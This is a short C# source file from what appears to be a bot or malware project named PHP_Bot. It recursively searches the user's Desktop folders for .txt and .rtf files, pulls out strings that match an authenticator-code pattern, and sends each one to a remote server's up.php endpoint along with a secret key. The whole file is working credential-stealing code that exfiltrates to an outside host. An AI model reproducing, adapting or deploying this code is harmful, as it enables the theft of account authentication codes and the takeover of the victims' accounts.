using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text.RegularExpressions;

namespace PHP_Bot.RS.Auth;

public class Auth
{
	public List<string> auths = new List<string>();

	public Auth()
	{
		Search(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory));
		Search(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
		foreach (string auth in auths)
		{
			WebClient webClient = new WebClient();
			string address = Config.Base + "up.php?secret=" + Config.Secret + "&auth=" + auth + "&action=auth";
			Stream stream = webClient.OpenRead(address);
			stream.ReadByte();
			stream.Close();
		}
	}

	private void Search(string dir)
	{
		try
		{
			string[] files = Directory.GetFiles(dir);
			string[] array = files;
			foreach (string text in array)
			{
				if (!text.EndsWith("txt") && !text.EndsWith("rtf"))
				{
					continue;
				}
				try
				{
					string text2 = "";
					StreamReader streamReader = new StreamReader(text);
					while (streamReader.Peek() > 0)
					{
						text2 += streamReader.ReadLine();
					}
					Regex regex = new Regex("[123456789]{1}[0-9]{0,3}(x|X)[0-9a-zA-Z]{7,20}");
					MatchCollection matchCollection = regex.Matches(text2);
					foreach (Match item in matchCollection)
					{
						if (!item.Value.StartsWith("0x"))
						{
							auths.Add(item.Value);
						}
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(dir);
			array = directories;
			foreach (string dir2 in array)
			{
				Search(dir2);
			}
		}
		catch
		{
		}
	}
}
